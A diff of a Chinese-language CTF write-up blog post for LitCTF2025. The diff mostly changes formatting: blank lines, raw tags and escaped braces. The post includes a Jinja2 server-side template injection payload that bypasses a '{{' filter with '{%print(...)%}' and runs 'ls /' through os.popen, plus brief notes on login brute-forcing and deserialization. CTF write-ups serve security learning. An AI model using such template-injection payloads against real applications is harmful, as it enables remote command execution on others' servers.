@@ -1,4 +1,5 @@
 ---
+
 title: LitCTF2025（公开赛道）
 date: 2025-08-30 18:19:31
 updated: 2025-09-02 21:31:20
@@ -6,9 +7,9 @@ author: Xebdria
 categories:
   - wp
   - 比赛
+
 ---
 
-{% raw %}
 ## easy_file
 
 首先是登入界面爆破发现账户密码是base64后的admin和password，进入界面看源码也能看到是对其经过处理的
@@ -25,15 +26,15 @@ categories:
 
 ## 星愿信箱
 
-需要包含文字，过滤了{{吧，我们用{%绕过了，没有回显我们就加print这样
+需要包含文字，过滤了&#123;&#123;吧，我们用&#123;%绕过了，没有回显我们就加print这样
 
 ![](http://xendria.icu/wp-content/uploads/2025/08/b001abb5-197f-4715-a593-f3bcfcafda6a-1024x630.png)
 
 然后用的是
 
 ```
-<code>{%print(lipsum.<strong>globals</strong>.<strong>builtins</strong>.<strong>import</strong>('os').popen('ls /
-').read())%}</code>
+<code>&#123;%print(lipsum.<strong>globals</strong>.<strong>builtins</strong>.<strong>import</strong>('os').popen('ls /
+').read())%&#125;</code>
 ```
 
 ![](http://xendria.icu/wp-content/uploads/2025/08/9586dfed-f910-48e5-bc1b-61f5275bb79a-1024x718.png)
@@ -566,4 +567,3 @@ echo urlencode(serialize($d));
 ## 总结
 
 拖那么久才想起来复现，easy_signineasy_signin比赛时候没出来有点可惜，这题反序列化的话其实现在还是有点迷迷糊糊（本来基础不扎实），加油吧！官方wp[https://godyu.com/13917.html](https://godyu.com/13917.html)
-{% endraw %}
